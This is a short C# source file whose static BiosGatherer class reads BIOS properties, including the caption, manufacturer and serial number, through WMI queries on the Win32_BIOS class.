namespace NoiseMe.Drags.App.Data.WMI
{
	public static class BiosGatherer
	{
		public static string GetCaption()
		{
			return WmiInstance.PropertyQuery<string>("Win32_BIOS", "Caption");
		}

		public static string GetDescription()
		{
			return WmiInstance.PropertyQuery<string>("Win32_BIOS", "Description");
		}

		public static string GetName()
		{
			return WmiInstance.PropertyQuery<string>("Win32_BIOS", "Name");
		}

		public static string GetManufacturer()
		{
			return WmiInstance.PropertyQuery<string>("Win32_BIOS", "Manufacturer");
		}

		public static bool? IsPrimaryBios()
		{
			return WmiInstance.PropertyQuery<bool?>("Win32_BIOS", "PrimaryBIOS");
		}

		public static string GetSerialNumber()
		{
			return WmiInstance.PropertyQuery<string>("Win32_BIOS", "SerialNumber");
		}
	}
}
